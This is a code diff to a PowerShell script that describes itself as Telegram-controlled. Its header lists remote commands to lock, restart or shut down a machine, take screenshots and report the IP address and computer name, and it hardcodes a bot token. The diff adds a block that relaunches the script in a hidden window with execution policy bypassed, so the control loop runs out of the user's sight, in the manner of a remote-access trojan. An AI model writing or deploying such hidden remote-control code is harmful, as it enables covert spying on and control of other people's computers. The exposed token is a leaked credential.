@@ -1,3 +1,18 @@
+# Relaunch in background and auto-close visible window
+if (-not $env:PS_RUN_HIDDEN) {
+    $env:PS_RUN_HIDDEN = "1"
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = "powershell.exe"
+    $psi.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$PSCommandPath`""
+    $psi.WindowStyle = 'Hidden'
+    $psi.UseShellExecute = $true
+    [System.Diagnostics.Process]::Start($psi) | Out-Null
+    exit
+}
+
+
+
+
 # Telegram-Controlled PowerShell Script
 # Commands: /open_notepad, /visit <url>, /lock, /restart, /shutdown, /get_ip, /screenshot, /get_pcname
 $botToken = "7462575551:AAG66o16VhlQu_26sfPaEpIxvhRWKeHBh04"
@@ -207,3 +222,4 @@ while ($true) {
         Start-Sleep -Seconds 5
     }
 }
+
